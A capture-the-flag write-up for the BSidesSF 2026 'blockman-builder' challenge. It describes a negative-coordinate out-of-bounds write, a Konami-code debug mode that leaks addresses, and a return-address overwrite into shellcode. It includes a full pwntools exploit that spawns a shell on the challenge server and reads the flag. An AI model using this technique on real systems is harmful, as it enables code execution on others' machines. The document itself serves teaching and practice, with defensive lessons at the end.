# blockman-builder — PWN

**CTF**: BSidesSF 2026
**Category**: PWN
**Points**: 840
**Flag**: `CTF{yo_new_minus_world!}`

---

## TL;DR

ncurses block-building game with executable stack, no canary, PIE. Konami code activates hidden developer mode with stack/PIE address leaks. The level import parser's single-block path allows negative x/y coordinates (signed comparison, no lower bound check), enabling byte-by-byte OOB writes below the `world` buffer on main's stack. Overwrite `show_level_import`'s return address with shellcode address on the executable stack.

---

## Binary

```
bmb: ELF 64-bit LSB PIE, x86-64, not stripped, with debug_info
RELRO: Partial | Canary: No | NX: No (executable stack) | PIE: Yes
```

### Key Structures

- `world`: 32×512 byte array (`uint8_t world[32][512]`) allocated on **main's stack** (`rbp - 0x4030`)
- `developer_mode`: global bool at BSS offset 0xdac4
- Menu: Play, Build, Export, Import, Exit

---

## Vulnerability: OOB Write via Negative Coordinates (CWE-787)

**Location**: `load_level_from_text` at offset 0x3d52

Level format: `tile,x1,y1` per block entry. Parsed with:
```c
sscanf(line, "%hhd,%ld,%ld,%ld,%ld", &tile, &x1, &y1, &x2, &y2);
```

For single blocks (3 fields parsed), bounds checks are:
```c
if (level_width <= x1) goto skip;   // signed: negative x1 passes!
if (y1 > 0x1f) goto skip;           // signed: negative y1 passes!
world[y1][x1] = tile;               // OOB write
```

**No lower bound check on x1 or y1.** Negative values pass the signed comparisons, allowing writes at arbitrary negative offsets from `world[0][0]`.

The rect-block path (5 fields) correctly checks `x >= 0` and `y >= 0`, but the single-block path does not.

### Target: show_level_import's Return Address

```
main's rbp - 0x4030: world[0][0]     (world buffer start)
main's rbp - 0x4078: show_level_import's return address
```

Offset from `world[0][0]` to return address = **-0x48 = -72 bytes**

Each block entry writes 1 byte (`tile` is `%hhd`, range -128..127 = 0x00-0xFF). Eight entries at `y=0, x=-72..-65` overwrite the full 8-byte return address.

---

## Developer Mode: Address Leak

Hidden Konami code in `run_menu` (offset 0x9530):
```
UP UP DOWN DOWN LEFT RIGHT LEFT RIGHT ENTER
```
Sets `developer_mode = true`. The editor's `draw_editor` function then renders a debug panel showing:
- `world addr=0x...` — address of the `world` global pointer (BSS → PIE leak)
- `world=0x...` — value of the pointer (stack → ASLR leak)

**Catch**: The dev panel is rendered to the right of the game area. With the default level width (128), the game area exceeds 120 columns and the panel is off-screen. Solution: **import a narrow level (width=64) first**, making room for the debug panel within the 120-col terminal.

---

## Exploit Steps

### 1. Import Narrow Level
Navigate menu to Import, send a base64+zlib level with `width=64` and no blocks. This shrinks the game area so the developer panel fits.

### 2. Activate Developer Mode
Send the Konami code (application cursor mode: `\x1bOA/B/C/D` for arrows). Developer mode enables the debug panel in the editor.

### 3. Enter Editor, Leak Addresses
Navigate to Build. The developer panel displays `world=0x...` (stack address of world buffer).

### 4. Import Exploit Level
Quit editor, navigate to Import. Send a crafted level:

**Shellcode** (48 bytes, `execve("/bin/sh")`) at `world[1][0..47]`:
```
tile_value,x,1    (one entry per shellcode byte)
```

**Return address overwrite** at `world[0][-72..-65]`:
```
tile_value,-72,0  through  tile_value,-65,0
```
Each tile byte is the corresponding byte of `p64(world_ptr + 512)` (address of shellcode at `world[1][0]`).

### 5. Shellcode Executes
`load_level_from_text` returns → `show_level_import` does cleanup → `leave; ret` → pops corrupted return address → jumps to shellcode → shell!

---

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *
import time, re, pyte, base64, zlib

context.arch = 'amd64'
HOST = 'blockman-builder-1ecf087f.challenges.bsidessf.net'
PORT = 1184
COLS, ROWS = 120, 60
UP=b'\x1bOA'; DOWN=b'\x1bOB'; LEFT=b'\x1bOD'; RIGHT=b'\x1bOC'; ENTER=b'\n'

def make_level(width, shellcode=None, world_ptr=None):
    lines = ["clear", str(width), "0"]
    blocks = []
    if shellcode:
        for i, byte in enumerate(shellcode):
            tile = byte if byte < 128 else byte - 256
            blocks.append(f"{tile},{i},1")
        ret_bytes = p64(world_ptr + 512)
        for i in range(8):
            byte = ret_bytes[i]
            tile = byte if byte < 128 else byte - 256
            blocks.append(f"{tile},{-72 + i},0")
    lines.append(str(len(blocks)))
    lines.extend(blocks)
    text = '\n'.join(lines) + '\n'
    return base64.b64encode(zlib.compress(text.encode())).decode()

io = remote(HOST, PORT); io.timeout = 10
screen = pyte.Screen(COLS, ROWS); stream = pyte.Stream(screen)

def rf(t=1.0):
    try: raw = io.recv(timeout=t); stream.feed(raw.decode('latin-1')); return raw
    except: return b''

def do_import(payload):
    for _ in range(3): io.send(DOWN); time.sleep(0.3); rf(0.3)
    io.send(ENTER); time.sleep(1); rf(1)
    io.sendline(payload.encode()); time.sleep(0.5)
    io.sendline(b''); time.sleep(2); rf(2)

time.sleep(3); rf(5)
do_import(make_level(64))  # Narrow level for dev panel

for key in [UP, UP, DOWN, DOWN, LEFT, RIGHT, LEFT, RIGHT]:  # Konami
    io.send(key); time.sleep(0.3); rf(0.3)
io.send(ENTER); time.sleep(1); rf(1)

io.send(DOWN); time.sleep(0.5); rf(0.5)  # Enter Build
io.send(ENTER); time.sleep(3); rf(3)

full = '\n'.join(screen.display)
world_ptr = int(re.search(r'world=(0x[0-9a-f]+)', full).group(1), 16)
log.success(f"world ptr: {hex(world_ptr)}")

io.send(b'q'); time.sleep(1); rf(1)  # Quit editor
io.send(b'n'); time.sleep(1); rf(1)

shellcode = asm(shellcraft.sh())
do_import(make_level(512, shellcode, world_ptr))

time.sleep(1); io.sendline(b'cat /home/ctf/flag.txt')
time.sleep(2); result = io.recv(timeout=5)
clean = re.sub(rb'\x1b\[[0-9;]*[A-Za-z]', b'', result)
flag = re.search(rb'CTF\{[^}]+\}', clean)
if flag: log.success(f"FLAG: {flag.group().decode()}")
io.interactive()
```

---

## Flag

```
CTF{yo_new_minus_world!}
```

---

## Key Lessons

1. **Signed comparison for bounds checking**: The single-block path checks `x1 < width` and `y1 <= 31` using signed comparisons but doesn't check for negative values. The rect-block path has proper `x >= 0` and `y >= 0` checks, showing inconsistent validation.

2. **Stack-allocated buffers amplify OOB writes**: The `world` buffer on main's stack means negative-offset writes reach saved frame pointers and return addresses of called functions.

3. **Hidden debug features in release builds**: The Konami code developer mode leaks PIE base and stack addresses. Debug/dev features should be stripped from production.

4. **Executable stack makes exploitation trivial**: Without NX, shellcode can be placed directly in the world buffer. Even with PIE+ASLR, the address leak from developer mode provides everything needed.

5. **ncurses application cursor mode**: Arrow keys send `\x1bOA/B/C/D` (SS3 mode) not `\x1b[A/B/C/D` (CSI mode) when `keypad(TRUE)` and `\x1b[?1h` are set.
